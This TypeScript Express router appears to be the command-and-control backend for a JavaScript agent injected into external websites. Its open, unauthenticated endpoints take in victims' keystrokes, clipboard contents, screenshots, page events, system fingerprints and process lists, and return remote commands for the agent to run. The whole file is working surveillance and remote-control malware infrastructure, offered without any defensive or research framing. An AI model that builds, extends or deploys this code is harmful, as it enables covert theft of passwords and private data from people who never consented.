// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Public omega-agent route — no Clerk auth. Agents on external sites call these.
// All responses include permissive CORS so cross-origin JS agents work.
import { Router, type IRouter, type Request, type Response } from "express";
import { eq, and, desc } from "drizzle-orm";
import {
  db, hostsTable, keystrokesTable, screenshotsTable,
  remoteCommandsTable, systemInfoTable, processesTable,
  windowsListTable, eventsTable, clipboardTable,
} from "@workspace/db";
import { resolveToken, tokenForHost, screenshotData } from "../../lib/omega-store";
import { serializeDates } from "../../lib/serialize";

const router: IRouter = Router();

// ── CORS helper (agents run on external origins) ─────────────────────────────
function agentCors(req: Request, res: Response) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

router.options("/{*path}", (req, res) => {
  agentCors(req, res);
  res.sendStatus(204);
});

// ── Helper: resolve token → hostId, update lastSeen + status ────────────────
async function touchHost(token: string): Promise<number | null> {
  const hostId = resolveToken(token);
  if (!hostId) return null;
  const now = new Date().toISOString();
  await db.update(hostsTable)
    .set({ status: "online", lastSeen: now, latencyMs: null, updatedAt: new Date() })
    .where(eq(hostsTable.id, hostId));
  return hostId;
}

// ── POST /omega-agent/checkin ──────────────────────────────────────────────
// Agent calls this every N seconds. Returns pending commands.
// Body: { token, hostId, url, title, keystrokes: [{k, t, ts}], events: [{type, target, ts}] }
router.post("/checkin", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, keystrokes = [], url, title, events: pageEvents = [] } = req.body ?? {};
  if (!token || typeof token !== "string") { res.status(400).json({ error: "token required" }); return; }
  const hostId = await touchHost(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }

  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, hostId));

  // Store keystrokes
  if (Array.isArray(keystrokes) && keystrokes.length > 0) {
    const grouped: Record<string, string[]> = {};
    for (const k of keystrokes) {
      const win = String(k.t || title || "Unknown");
      (grouped[win] ??= []).push(String(k.k ?? ""));
    }
    for (const [windowTitle, keys] of Object.entries(grouped)) {
      await db.insert(keystrokesTable).values({ hostId, windowTitle, text: keys.join("") });
    }
  }

  // Store page events in events table (cap to 5 per checkin)
  const eventsToLog = Array.isArray(pageEvents) ? pageEvents.slice(0, 5) : [];
  for (const ev of eventsToLog) {
    if (ev.type && ev.target) {
      await db.insert(eventsTable).values({
        hostId,
        hostIp: host?.ip ?? null,
        hostLabel: host?.label ?? null,
        category: "Event",
        action: `${ev.type} on ${ev.target}`,
        details: url ?? "",
        severity: "info",
      });
    }
  }

  // Return pending commands
  const pending = await db.select().from(remoteCommandsTable)
    .where(and(eq(remoteCommandsTable.hostId, hostId), eq(remoteCommandsTable.status, "pending")))
    .orderBy(remoteCommandsTable.executedAt)
    .limit(10);

  // Mark them as "sent"
  if (pending.length > 0) {
    for (const cmd of pending) {
      await db.update(remoteCommandsTable)
        .set({ status: "sent" })
        .where(eq(remoteCommandsTable.id, cmd.id));
    }
  }

  res.json({ ok: true, commands: pending });
});

// ── POST /omega-agent/result ───────────────────────────────────────────────
// Agent reports result of a command. Body: { token, cmdId, result }
router.post("/result", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, cmdId, result } = req.body ?? {};
  if (!token || cmdId === undefined) { res.status(400).json({ error: "token and cmdId required" }); return; }
  const hostId = resolveToken(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }
  await db.update(remoteCommandsTable)
    .set({ status: "executed", result: String(result ?? ""), executedAt: new Date() })
    .where(and(eq(remoteCommandsTable.id, Number(cmdId)), eq(remoteCommandsTable.hostId, hostId)));
  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, hostId));
  await db.insert(eventsTable).values({
    hostId,
    hostIp: host?.ip ?? null,
    hostLabel: host?.label ?? null,
    category: "Command",
    action: "Command result received",
    details: String(result ?? "").substring(0, 200),
    severity: "info",
  });
  res.json({ ok: true });
});

// ── POST /omega-agent/screenshot ──────────────────────────────────────────
// Agent sends base64 screenshot. Body: { token, cmdId?, dataUrl, width, height, label }
router.post("/screenshot", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, cmdId, dataUrl, width = 1280, height = 720, label = "Page" } = req.body ?? {};
  if (!token || !dataUrl) { res.status(400).json({ error: "token and dataUrl required" }); return; }
  const hostId = await touchHost(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }

  const sizeKb = Math.round(dataUrl.length * 0.75 / 1024);
  const [shot] = await db.insert(screenshotsTable)
    .values({ hostId, label: String(label).substring(0, 100), widthPx: Number(width), heightPx: Number(height), sizeKb })
    .returning();

  // Store base64 in memory (not in DB — images are large)
  screenshotData.set(shot.id, String(dataUrl));

  if (cmdId !== undefined) {
    await db.update(remoteCommandsTable)
      .set({ status: "executed", result: `Screenshot #${shot.id} — ${shot.widthPx}×${shot.heightPx}, ${sizeKb}kb`, executedAt: new Date() })
      .where(and(eq(remoteCommandsTable.id, Number(cmdId)), eq(remoteCommandsTable.hostId, hostId)));
  }

  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, hostId));
  await db.insert(eventsTable).values({
    hostId,
    hostIp: host?.ip ?? null,
    hostLabel: host?.label ?? null,
    category: "Screen",
    action: "Screenshot received",
    details: `${shot.widthPx}×${shot.heightPx} — ${sizeKb}kb`,
    severity: "info",
  });

  res.json({ ok: true, id: shot.id });
});

// ── GET /omega-agent/screenshot-data/:id ──────────────────────────────────
// Dashboard fetches the base64 image. Protected by Clerk (handled in index.ts via requireAuth).
// This route is registered UNDER requireAuth (via omega/index.ts), not here.
// But we expose a helper export so screenshots.ts can reference the store.

// ── POST /omega-agent/sysinfo ─────────────────────────────────────────────
// Agent sends real browser/OS fingerprint.
// Body: { token, osName, osVersion, cpu, username, computerName, resolution, ramTotalMb, ramUsedMb, uptimeSeconds }
router.post("/sysinfo", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, ...info } = req.body ?? {};
  if (!token) { res.status(400).json({ error: "token required" }); return; }
  const hostId = await touchHost(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }

  const existing = await db.select().from(systemInfoTable).where(eq(systemInfoTable.hostId, hostId)).limit(1);
  const payload = {
    hostId,
    osName: String(info.osName || "Unknown"),
    osVersion: String(info.osVersion || ""),
    cpu: String(info.cpu || ""),
    ramTotalMb: Number(info.ramTotalMb) || 0,
    ramUsedMb: Number(info.ramUsedMb) || 0,
    username: String(info.username || "agent"),
    computerName: String(info.computerName || "unknown"),
    uptimeSeconds: Number(info.uptimeSeconds) || 0,
    diskTotalGb: Number(info.diskTotalGb) || 0,
    diskUsedGb: Number(info.diskUsedGb) || 0,
    resolution: String(info.resolution || ""),
    lastUpdated: new Date(),
  };

  if (existing.length === 0) {
    await db.insert(systemInfoTable).values(payload);
  } else {
    await db.update(systemInfoTable).set(payload).where(eq(systemInfoTable.hostId, hostId));
  }

  res.json({ ok: true });
});

// ── POST /omega-agent/processes ───────────────────────────────────────────
// Agent sends list of browser processes/scripts/service workers.
// Body: { token, processes: [{pid, name, cpuPct, memMb}] }
router.post("/processes", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, processes = [] } = req.body ?? {};
  if (!token) { res.status(400).json({ error: "token required" }); return; }
  const hostId = resolveToken(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }

  if (!Array.isArray(processes) || processes.length === 0) { res.json({ ok: true }); return; }

  // Replace existing process list
  await db.delete(processesTable).where(eq(processesTable.hostId, hostId));
  const rows = processes.slice(0, 50).map((p: any) => ({
    hostId,
    pid: Number(p.pid) || 0,
    name: String(p.name || "unknown").substring(0, 200),
    cpuPct: Number(p.cpuPct) || 0,
    memMb: Number(p.memMb) || 0,
    status: "running" as const,
  }));
  if (rows.length > 0) {
    await db.insert(processesTable).values(rows);
  }
  res.json({ ok: true });
});

// ── POST /omega-agent/windows ─────────────────────────────────────────────
// Agent sends list of frames/windows. Body: { token, windows: [{windowHandle, title, processName, isActive}] }
router.post("/windows", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, windows = [] } = req.body ?? {};
  if (!token) { res.status(400).json({ error: "token required" }); return; }
  const hostId = resolveToken(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }

  if (!Array.isArray(windows)) { res.json({ ok: true }); return; }

  // Replace window list
  await db.delete(windowsListTable).where(eq(windowsListTable.hostId, hostId));
  const rows = windows.slice(0, 20).map((w: any) => ({
    hostId,
    windowHandle: String(w.windowHandle || "main").substring(0, 50),
    title: String(w.title || "Unknown").substring(0, 200),
    processName: String(w.processName || "browser").substring(0, 100),
    isActive: Boolean(w.isActive),
    isClosed: false,
  }));
  if (rows.length > 0) {
    await db.insert(windowsListTable).values(rows);
  }
  res.json({ ok: true });
});

// ── POST /omega-agent/clipboard-capture ───────────────────────────────────
// Agent sends clipboard content. Body: { token, content }
router.post("/clipboard-capture", async (req: Request, res: Response): Promise<void> => {
  agentCors(req, res);
  const { token, content } = req.body ?? {};
  if (!token) { res.status(400).json({ error: "token required" }); return; }
  const hostId = resolveToken(token);
  if (!hostId) { res.status(401).json({ error: "Invalid token" }); return; }
  if (content !== undefined) {
    await db.insert(clipboardTable).values({ hostId, content: String(content).substring(0, 10000), contentType: "text" });
  }
  res.json({ ok: true });
});

export default router;
